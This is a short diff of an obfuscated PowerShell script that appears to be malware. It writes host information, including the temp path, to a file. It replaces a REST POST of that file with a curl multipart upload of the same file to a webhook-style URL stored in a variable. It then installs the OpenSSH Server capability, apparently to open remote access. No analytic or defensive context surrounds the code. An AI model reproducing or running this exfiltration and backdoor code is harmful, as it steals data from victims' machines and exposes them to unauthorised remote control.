@@ -36,12 +36,7 @@ Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP
 Add-Content -Path $CRYnrkaDbe -Value $env:temp
 Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs
-$xehGLcIRou = Get-Content $CRYnrkaDbe
-$xmWrZacmJz = @{
-    'username' = 'Config'
-    'content' = $xehGLcIRou
-}
-Invoke-RestMethod -Uri $PEBgxuJUfd -Method 'post' -Body $xmWrZacmJz
+cmd /c curl -F "payload_json={\"username\": \"test\", \"content\": \"world\"}" -F "file=@$CRYnrkaDbe" $PEBgxuJUfd
 mkdir $qsQBioVOkY
 Set-Location $qsQBioVOkY
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
